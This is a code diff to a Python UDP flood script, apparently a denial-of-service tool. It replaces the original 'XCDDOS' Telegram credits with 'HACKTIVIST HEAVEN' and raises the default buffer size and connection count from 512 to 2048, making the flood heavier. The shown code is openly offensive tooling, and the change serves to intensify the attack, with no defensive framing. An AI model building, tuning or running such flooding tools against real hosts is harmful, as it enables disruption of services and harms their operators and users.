@@ -1,6 +1,4 @@
-# Made By XCDDOS || Xc Corporation
-# Channel t.me/Xc_Corporation
-# Dm t.me/Xin_Kenji
+# Made By HACKTIVIST HEAVEN 
 
 import socket
 import random
@@ -12,8 +10,8 @@ stop_event = threading.Event()
 lock = threading.Lock()
 count = 0
 bit = 0
-buffer_size = 512  # Default buffer size
-connections = 512  # Default number of connections
+buffer_size = 2048  # Default buffer size
+connections = 2048  # Default number of connections
 
 def udp_flood(ip, port, seconds):
     global count, bit, buffer_size, connections
